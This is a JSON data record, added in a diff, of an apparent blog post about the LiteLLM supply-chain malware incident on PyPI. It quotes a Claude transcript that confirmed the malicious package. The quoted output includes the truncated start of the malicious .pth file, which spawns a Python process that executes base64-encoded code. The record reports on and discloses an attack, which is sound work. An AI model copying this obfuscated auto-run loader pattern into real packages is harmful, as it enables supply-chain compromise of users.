@@ -1,0 +1,35 @@
+{
+  "id": "td_43d586b8",
+  "source": "rss",
+  "source_id": "https://simonwillison.net/2026/Mar/26/response-to-the-litellm-malware-attack/#atom-everything",
+  "source_url": "https://simonwillison.net/2026/Mar/26/response-to-the-litellm-malware-attack/#atom-everything",
+  "content_type": "article",
+  "creator": {
+    "id": "simon_willison's_weblog",
+    "name": "Simon Willison's Weblog",
+    "handle": "Simon Willison's Weblog",
+    "platform": "rss",
+    "follower_count": null,
+    "is_tracked": true
+  },
+  "title": "My minute-by-minute response to the LiteLLM malware attack",
+  "body_text": "My minute-by-minute response to the LiteLLM malware attack\nCallum McMahon reported the LiteLLM malware attack to PyPI. Here he shares the Claude transcripts he used to help him confirm the vulnerability and decide what to do about it. Claude even suggested the PyPI security contact address after confirming the malicious code in a Docker container:\n\nConfirmed. Fresh download from PyPI right now in an isolated Docker container:\nInspecting: litellm-1.82.8-py3-none-any.whl\nFOUND: litellm_init.pth\nSIZE: 34628 bytes\nFIRST 200 CHARS:\nimport os, subprocess, sys; subprocess.Popen([sys.executable, \"-c\", \"import base64; exec(base64.b64decode('aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHRlbXBmaWxl...\n\nThe malicious litellm==1.82.8 is live on PyPI right now and anyone installing or upgrading litellm will be infected. This needs to be reported to security@pypi.org immediately.\n\nI was chuffed to see Callum use my claude-code-transcripts tool to publish the transcript of the conversation.\n\n    Via Hacker News\n\n\n    Tags: pypi, security, ai, generative-ai, llms, claude, supply-chain",
+  "word_count": 140,
+  "published_at": "2026-03-26T23:58:22.000Z",
+  "ingested_at": "2026-03-28T00:15:42.454Z",
+  "engagement": {
+    "views": null,
+    "likes": null,
+    "replies": null,
+    "reposts": null,
+    "bookmarks": null,
+    "engagement_rate": null
+  },
+  "tags": [],
+  "domain": "tech_startup",
+  "language": "en",
+  "media_duration_seconds": null,
+  "distilled": true,
+  "discourse_format": "news_article",
+  "cited_creator_ids": []
+}
